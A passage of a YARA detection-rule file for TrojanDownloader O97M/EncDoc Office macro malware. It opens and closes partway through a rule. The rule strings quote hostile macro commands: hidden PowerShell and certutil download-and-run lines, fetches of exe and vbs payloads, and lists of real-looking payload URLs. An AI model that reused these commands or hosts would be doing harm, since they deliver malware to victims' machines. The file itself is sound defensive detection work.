        $x_1_3 = "= Replace(\"87p87ow87e87r87s87h87e87l87l -w87i87n87d87ow87s87t87y87l87e h87i87dd87en 87I87nvo87ke87-W87ebR87e87qu87e87s87t h87t87t87ps:87//a87zg87energie87.f87r/wp-c87on87tent/up87l87o87ads87/287022/02/87Office2021.exe" ascii //weight: 1
        $x_1_4 = "MsgBox \"Erreur lors de l'ouverture de fichier...\"" ascii //weight: 1
        $x_1_5 = ".Open (MonFichier1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SES_2147812870_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SES!MTB"
        threat_id = "2147812870"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")" ascii //weight: 1
        $x_1_2 = {2e 4e 61 6d 65 73 70 61 63 65 28 ?? ?? ?? ?? ?? 29 2e 53 65 6c 66 2e 49 6e 76 6f 6b 65 56 65 72 62 20 22 50 61 73 74 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 4f 70 65 6e 20 28 ?? ?? ?? ?? ?? 20 2b 20 22 5c [0-10] 2e 6a 73 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Application.Wait (Now + TimeValue(\"0:00:02\"))" ascii //weight: 1
        $x_1_5 = {2b 20 22 5c [0-10] 2e 74 78 74 22 20 41 73 20 ?? ?? ?? ?? ?? 20 2b 20 22 5c [0-10] 2e 6a 73 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SGS_2147813061_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SGS!MTB"
        threat_id = "2147813061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h2s(\"68 74 74 70 73 3A 2F 2F 77 77 77 2E 75 70 6C 6F 6F 64 65 72 2E 6E 65 74 2F 66 2F 74 6C 2F 34 34 2F 39 61 65 35 66 33 34 64 37 32 61 66 64 39 62 32 33 63 37 65 66 61 39 39 34 39 64 33 34 36 66 31 2F 61 2E 76 62 73\"), Environ(\"temp\") & \"\\a2.vbs" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"WScript.Sh\" & \"ell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAS_2147813420_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAS!MTB"
        threat_id = "2147813420"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "servidorcarlosydavid.es/wp-admin/jkNPgHxNjF" ascii //weight: 1
        $x_1_2 = "gmo-sol-p10.heteml.jp/includes/UoJMgYAc1EES" ascii //weight: 1
        $x_1_3 = "iashanghai.cn/z/Z1PG6ulBh20plss" ascii //weight: 1
        $x_1_4 = "pasionportufuturo.pe/wp-content/HkUfvw0xuCy5" ascii //weight: 1
        $x_1_5 = "dmdagents.com.au/vqwbgz/CL4Bo4C4VS0deg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAT_2147813844_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAT!MTB"
        threat_id = "2147813844"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "o_open()msgbox_strreverse(sreversemod(\"cefioflalstine-rr!roer\"))computeroo1=strreverse(sreversemod(\"" ascii //weight: 1
        $x_1_2 = "e(strreverse(sreversemod(sreversemod(sreversemod(\":\")))))))set_hotel_=_getobject_(beach)hotel" ascii //weight: 1
        $x_1_3 = "flx698whs)step2sreversemod=sreversemod&strreverse(mid(flx698whs,acs65saqf,2))doeventsnext" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_EMTO_2147813889_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.EMTO!MTB"
        threat_id = "2147813889"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "asempaye.com/404/zREXldL8ZfpsEepiC/" ascii //weight: 1
        $x_1_2 = "freesoft18.com/urq/dd1s9WyDLkdM/" ascii //weight: 1
        $x_1_3 = "vidarefugio.com/wp-content/AQj7kZUR8VcKYOe/" ascii //weight: 1
        $x_1_4 = "rjssjharkhand.com/wp-content/NEenGg5UHA24gnZAlYj/" ascii //weight: 1
        $x_1_5 = "pedroribeiro.work/wp-admin/qOkQQ/" ascii //weight: 1
        $x_1_6 = "hojeemdia.life/detector/klwHgC9eat/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AIAX_2147813988_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AIAX!MTB"
        threat_id = "2147813988"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\Aot\\aia.ocx" ascii //weight: 1
        $x_1_2 = "C:\\Aot\\aia2.ocx" ascii //weight: 1
        $x_1_3 = "C:\\Aot\\aia1.ocx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAU_2147814191_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAU!MTB"
        threat_id = "2147814191"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "135024ftcopengagendstwebclieemntnekammerloaffdownloadfi" ascii //weight: 1
        $x_1_2 = "dosleep25201fobjectnew" ascii //weight: 1
        $x_1_3 = "thenshellmillerbeerlost" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKP_2147814358_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKP!MTB"
        threat_id = "2147814358"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://52.59.234.180/class/ten/65087710033.bat" ascii //weight: 1
        $x_1_2 = ".exe.exe && Grfciafhjqghqqtyyb.exe.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAV_2147814455_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAV!MTB"
        threat_id = "2147814455"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "capersonembcertainlydirectorshouldstudentat" ascii //weight: 1
        $x_2_2 = "echocheckingnowprint1powershellwhidsleepse33startbitstransfersouhttpsrealwallx24hrcomsecvimvpnexe" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PRA_2147814487_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PRA!MTB"
        threat_id = "2147814487"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URL = \"http://68.183.67.198/vki.exe\" 'Where to download the file from" ascii //weight: 1
        $x_1_2 = "stream_obj.savetofile FileName, 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_IWDA_2147814710_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.IWDA!MTB"
        threat_id = "2147814710"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3c 30 2c 20 [0-8] 2d 73 [0-8] 22 2c 30 2c 30 29 [0-16] 5c 61 64 77 2e 6f 63 78 [0-16] 5c 61 64 77 2e 6f 63 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_IWDB_2147814711_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.IWDB!MTB"
        threat_id = "2147814711"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w\"&\"ww.e\"&\"qu\"&\"us.c\"&\"o\"&\"m/2\"&\"i8\"&\"yt/Gh\"&\"BSz\"&\"6p\"&\"eG/\",\"" ascii //weight: 1
        $x_1_2 = "ag\"&\"enc\"&\"iades\"&\"arro\"&\"llori\"&\"v\"&\"era.c\"&\"o\"&\"m.uy/w\"&\"p-a\"&\"d\"&\"mi\"&\"n/I8I\"&\"cji7q\"&\"qkL\"&\"MC\"&\"a0\"&\"K5/\",\"" ascii //weight: 1
        $x_1_3 = "co\"&\"mput\"&\"erc\"&\"oll\"&\"egi\"&\"at\"&\"e.c\"&\"o\"&\"m.p\"&\"k/lm\"&\"s.com\"&\"pute\"&\"rcolle\"&\"gia\"&\"te.c\"&o\"&\"m.p\"&\"k/9u\"&\"2Y\"&\"YQ\"&\"EK\"&\"Kr/\",\"" ascii //weight: 1
        $x_1_4 = "b\"&\"ouse\"&\"b\"&\"re.es/w\"&\"ordpr\"&\"ess_bo/kpK\"&\"K\"&\"EIl/\",\"" ascii //weight: 1
        $x_1_5 = "djho\"&\"st.n\"&\"l/ra\"&\"di\"&\"o/VU\"&\"Iq8x\"&\"jsH\"&\"UG\"&\"Z\"&\"xJ/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KAI_2147814749_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KAI!MTB"
        threat_id = "2147814749"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://www.mediafire.com/file/7zhcp0nt4ds3gkj/NiceHashQuickMinerV1003.exe/file\"\" Ztdzktjb.exe.exe && Ztdzktjb.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SJS_2147814783_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SJS!MTB"
        threat_id = "2147814783"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 66 69 6c 65 2f [0-63] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 20 26 26 20 01 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SJS_2147814783_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SJS!MTB"
        threat_id = "2147814783"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 29 20 2b 20 22 5c ?? ?? ?? ?? ?? 2e 62 61 74 22 20 27 79 6f 75 20 63 61 6e 20 73 70 65 63 69 66 79 20 68 65 72 65 20 74 68 65 20 74 65 78 74 20 66 69 6c 65 20 6e 61 6d 65 20 79 6f 75 20 77 61 6e 74 20 74 6f 20 63 72 65 61 74 65}  //weight: 1, accuracy: Low
        $x_1_2 = {50 72 69 6e 74 20 23 31 2c 20 ?? ?? ?? ?? ?? 20 27 75 73 69 6e 67 20 57 72 69 74 65 20 63 6f 6d 6d 61 6e 64 20 69 6e 73 74 65 61 64 20 6f 66 20 50 72 69 6e 74 20 77 69 6c 6c 20 72 65 73 75 6c 74 20 69 6e 20 68 61 76 69 6e 67 20 79 6f 75 72 20 64 61 74 61 20 69 6e 20 71 75 6f 74 65 73 20 69 6e 20 74 68 65 20 6f 75 74 70 75 74 20 74 65 78 74 20 66 69 6c 65}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 61 6e 67 65 28 22 ?? 31 30 ?? 22 29 2e 56 61 6c 75 65 20 2b 20 22 20 22 20 2b 20 52 61 6e 67 65 28 22 ?? 31 30 ?? 22 29 2e 56 61 6c 75 65 20 2b 20 52 61 6e 67 65 28 22 ?? 31 30 ?? 22 29 2e 56 61 6c 75 65 20 2b 20 22 20 2d 22 20 2b 20 52 61 6e 67 65 28 22 ?? 31 30 ?? 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 52 61 6e 67 65 28 22 ?? 31 30 ?? 22 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = "Cells(2, 1).Value = 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ESNG_2147815134_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ESNG!MTB"
        threat_id = "2147815134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 22 26 22 74 74 70 22 26 22 73 3a 2f 2f [0-69] 2e [0-21] 2f [0-69] 2e 70 22 26 22 6e 22 26 22 67 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {68 22 26 22 74 74 70 22 26 22 73 3a 2f 2f [0-69] 2e [0-21] 2f [0-69] 2e 70 22 26 22 6e 67}  //weight: 1, accuracy: Low
        $x_1_3 = {68 22 26 22 74 74 22 26 22 70 73 3a 2f 2f [0-69] 2e [0-21] 2f [0-69] 2e 70 22 26 22 6e 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAX_2147815191_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAX!MTB"
        threat_id = "2147815191"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=0subauto_open()aatjgsdvfpcvewrendsubsubdocument_open()aatjgsdvfpcvewrend" ascii //weight: 1
        $x_1_2 = "b4147454156414268\")aeaddnizqrzn=aeaddnizqrzn+ilrzxfwwikwo(\"414341414b41416b41456b4156674172414351415377417041\")&ilrzxfwwikwo" ascii //weight: 1
        $x_1_3 = ".createaeaddnizqrzn,null,kahwhahyhdtayymveigf,intprocessidendf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAZ_2147815674_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAZ!MTB"
        threat_id = "2147815674"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"https://urbi\"&\"zstar\"&\"tu\"&\"p.c\"&\"o\"&\"m/c\"&\"yL5\"&\"fzZ\"&\"gb\"&\"H8/H\"&\"nf\"&\"ho.pn\"&\"g" ascii //weight: 1
        $x_1_2 = "\"https://ar\"&\"ya\"&\"ngl\"&\"obalsc\"&\"ho\"&\"ol.i\"&\"n/L2X\"&\"e4P\"&\"aSp\"&\"w\"&\"Yi/Hn\"&\"fh\"&\"o.pn\"&\"g" ascii //weight: 1
        $x_1_3 = "\"https://g\"&\"uru\"&\"na\"&\"naki\"&\"nte\"&\"rn\"&\"ati\"&\"on\"&\"al.c\"&\"o\"&\"m/7\"&\"ZflR\"&\"1u\"&\"bib\"&\"NT/H\"&\"nf\"&\"h\"&\"o.pn\"&\"g" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RPQ0212_2147815981_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RPQ0212!MTB"
        threat_id = "2147815981"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 74 65 78 74 3d 22 63 [0-10] 6d 64 2f 00 63 73 00 74 61 72 00 74 2f 00 62 22 [0-31] 2e [0-95] 05 [0-31] 3d 72 65 70 6c 61 63 65 28 05 2e [0-31] 2c 22 00 22 2c 22 22 29 6f 70 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PABA_2147816165_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PABA!MTB"
        threat_id = "2147816165"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "e()dimymbdtr,mydocspath,fegdn,vcfegdn=range(\"a105\").value+\"\"+range(\"a104\").value+range(\"a103\").value+\"-\"+range(\"a100\").valueymbdtr=cwyn()+\"\\cqjjq.ba" ascii //weight: 2
        $x_1_2 = "vc=fmwojhmaj(cwyn())endsubfunctionfmwojhmaj(v0df)setgsga=getobject(range(\"a106\").value)bdfdf=gsga.open(v0df+\"\\cqjjq.bat\")endfunctionprivatefunctioncwyn()cwyn=environ(\"appdata\")e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_JRSM_2147816544_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.JRSM!MTB"
        threat_id = "2147816544"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 3a 5c 78 35 63 50 72 6f 67 72 61 6d 44 61 74 61 5c 78 35 63 64 64 6f 6e 64 2e 63 6f 6d 5c 78 32 30 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 66 69 6c 65 2f [0-31] 2f [0-31] 2e 68 74 6d 2f 66 69 6c 65}  //weight: 1, accuracy: Low
        $x_1_2 = ").create(\"wscriptc:\\users\\public\\killlll.js\")" ascii //weight: 1
        $x_1_3 = "Create (\"wscript C:\\Users\\Public\\update.js\")" ascii //weight: 1
        $x_1_4 = "= \"!@##!!@%^@^^n&&$%#g&&$%#tcar:\"" ascii //weight: 1
        $x_1_5 = "5nooo_Proce66\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVN_2147816717_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVN!MTB"
        threat_id = "2147816717"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 74 72 52 65 76 65 72 73 65 28 22 74 78 74 2e 63 6e 45 2f ?? ?? 2f 35 34 2e 31 30 31 2e 32 33 31 2e 38 33 2f 2f 3a 70 74 74 68 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 20 26 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = "Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_DGSM_2147816795_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.DGSM!MTB"
        threat_id = "2147816795"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "setdhvdykard=tftji.opentextfile(rpkk+\"\\anzws.vbs\",8,true)" ascii //weight: 1
        $x_1_2 = "lxag=vqlzhb.open(f5fg0e+\"\\anzws.vbs\")" ascii //weight: 1
        $x_1_3 = "vnjer=\"appdata\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVO_2147816944_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVO!MTB"
        threat_id = "2147816944"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 53 74 72 52 65 76 65 72 73 65 28 22 74 78 74 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 63 6e 45 2f 31 2f 38 31 32 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 35 33 32 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 37 37 31 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 38 30 31 2f 2f 3a 70 74 74 68 22 29 2c 20 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 2c 20 22 2e 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 20 2b 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 20 2b 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 70 72 6f 63 65 73 73 69 64 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_DCSM_2147817183_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.DCSM!MTB"
        threat_id = "2147817183"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
